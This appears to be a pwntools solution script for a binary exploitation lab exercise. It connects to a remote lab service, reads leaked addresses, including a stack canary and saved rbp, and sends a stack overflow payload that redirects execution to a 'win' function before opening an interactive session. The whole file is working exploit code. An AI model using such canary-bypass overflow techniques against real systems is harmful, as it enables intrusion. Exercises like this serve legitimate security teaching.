from pwn import *

# r = process("./lab")
r = remote("10.113.184.121", 10041)

# printf("Gift: %p\n", win);
gift = r.recvline_startswith(b"Gift: ")[6:]
print("Gift:\t", gift)  # b'0x55866fc931e9'
win = int(gift, 16)

# printf("Gift2: ");
# write(1, buf, 32);
r.recvuntil(b"Gift2: ")
gift2 = r.recv(32)
print(
    "Gift2:\t", gift2
)  # b'\x00\x10\x00\x00\x00\x00\x00\x00\x00\x89\tW\xf7\x17\xd8\x13\x01\x00\x00\x00\x00\x00\x00\x00\x90\xbd\x83\xfe!\x7f\x00\x00'

local_val = b"A" * 8
canary = gift2[8:16]
rbp = gift2[16:24]
return_addr = p64(win + 8)

print("canary:\t", canary)

payload = local_val + canary + rbp + return_addr

# read(0, buf, 32);
r.send(payload)

r.interactive()
